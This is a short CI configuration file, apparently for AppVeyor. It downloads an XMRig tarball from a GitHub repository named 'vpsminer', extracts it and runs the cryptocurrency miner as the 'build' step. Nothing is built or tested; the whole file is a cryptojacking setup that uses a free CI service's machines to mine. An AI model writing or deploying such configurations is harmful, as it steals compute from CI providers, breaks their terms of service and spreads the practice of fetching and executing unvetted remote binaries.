version: 1.0.{build}
image: Ubuntu

# Environment setup for XMRig
environment:
  global:
    XMRIG_DIR: "./xmrigdir"       # Directory for extracted files
    TAR_FILE: "xmrigdir.tar.gz"    # Name of your tarball
    GITHUB_REPO_URL: "https://github.com/orkaroeli/vpsminer"  # GitHub repository link

# Install necessary packages
install:
  - sudo apt-get update
  - sudo apt-get install -y curl tar

# Steps before the build starts
before_build:
  # Download XMRig tarball from GitHub
  - curl -L $GITHUB_REPO_URL/raw/main/$TAR_FILE -o $TAR_FILE

  # Extract the tarball
  - tar -xvf $TAR_FILE

  # Navigate to the extracted directory
  - cd $XMRIG_DIR

  # Make the xmrig binary executable
  - chmod +x ./xmrig

build_script:
  # Run XMRig using config.json
  - ./xmrig --config=config.json

artifacts:
  - path: $XMRIG_DIR
    name: "XMRig_artifacts"
    
